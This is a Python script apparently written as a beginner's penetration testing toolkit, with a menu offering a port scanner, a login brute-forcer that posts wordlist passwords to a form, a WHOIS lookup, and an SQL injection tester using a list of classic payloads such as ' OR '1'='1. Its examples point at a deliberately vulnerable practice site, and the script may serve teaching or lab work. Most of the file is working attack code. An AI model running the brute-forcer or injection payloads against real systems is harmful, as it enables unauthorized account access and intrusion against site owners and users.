import socket
import requests
import whois

# ===================== MODULE 1: PORT SCANNER =====================
def port_scanner():
    target = input("Enter target IP or domain (e.g., testphp.vulnweb.com): ").strip()
    target = target.replace("http://", "").replace("https://", "").split("/")[0]

    common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 8080]

    print(f"\n[~] Scanning ports on {target}...\n")

    for port in common_ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((target, port))
            if result == 0:
                print(f"[+] Port {port} is open")
            else:
                print(f"[-] Port {port} is closed or filtered")
            sock.close()
        except Exception as e:
            print(f"[!] Error scanning port {port}: {e}")

# ===================== MODULE 2: BRUTE FORCE LOGIN =====================
def brute_forcer():
    url = input("Enter Login URL: ").strip()
    username = input("Enter Username: ").strip()
    wordlist_path = input("Enter path to password wordlist (e.g., passwords.txt): ").strip()

    try:
        with open(wordlist_path, 'r') as file:
            passwords = [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print("[!] Wordlist file not found.")
        return

    for password in passwords:
        try:
            data = {"uname": username, "pass": password, "login": "submit"}
            response = requests.post(url, data=data, timeout=5)

            if "Invalid" not in response.text and "incorrect" not in response.text and response.status_code == 200:
                print(f"[+] SUCCESS! Password found: {password}")
                return
            else:
                print(f"[-] Tried: {password}")
        except Exception as e:
            print(f"[!] Error with password {password}: {e}")
            continue

    print("[-] No valid password found.")

# ===================== MODULE 3: WHOIS LOOKUP =====================
def whois_lookup():
    domain = input("Enter domain (e.g., example.com): ").strip()
    try:
        info = whois.whois(domain)
        print("\n[~] WHOIS Info:\n")
        print(f"[+] Domain: {domain}")
        print(f"[+] Registrar: {info.registrar}")
        print(f"[+] Creation Date: {info.creation_date}")
        print(f"[+] Expiration Date: {info.expiration_date}")
        print(f"[+] Name Servers: {info.name_servers}")
        print(f"[+] Status: {info.status}")
        print(f"[+] Country: {info.country}")
        print(f"[+] Emails: {info.emails}")
    except Exception as e:
        print(f"[!] Error fetching WHOIS info: {e}")

# ===================== MODULE 4: SQL INJECTION TESTER =====================
def sql_injection_tester():
    url = input("Enter URL with vulnerable parameter (e.g., http://testphp.vulnweb.com/artists.php?artist=1): ").strip()
    payloads = ["1'", "' OR '1'='1", "'; --", "' OR 1=1#", "' OR 1=1--", "' OR 'a'='a", "' OR 1=1 LIMIT 1 --"]

    print("\n[~] Testing for SQL Injection...\n")

    for payload in payloads:
        test_url = url.split("=")[0] + "=" + payload
        try:
            response = requests.get(test_url, timeout=5)
            if "sql" in response.text.lower() or "syntax" in response.text.lower() or "error" in response.text.lower():
                print(f"[+] Potential SQLi vulnerability detected with payload: {payload}")
            else:
                print(f"[-] Tested: {payload}")
        except Exception as e:
            print(f"[!] Error testing payload {payload}: {e}")

# ===================== MAIN MENU =====================
def main():
    while True:
        print("\n=== 🛠 PENETRATION TESTING TOOLKIT ===")
        print("1. Port Scanner")
        print("2. Brute Force Login")
        print("3. WHOIS Lookup")
        print("4. SQL Injection Tester")
        print("5. Exit")

        choice = input("\nEnter your choice: ").strip()

        if choice == "1":
            port_scanner()
        elif choice == "2":
            brute_forcer()
        elif choice == "3":
            whois_lookup()
        elif choice == "4":
            sql_injection_tester()
        elif choice == "5":
            print("Exiting Toolkit.")
            break
        else:
            print("[!] Invalid choice. Try again.")

if __name__ == "__main__":
    main()
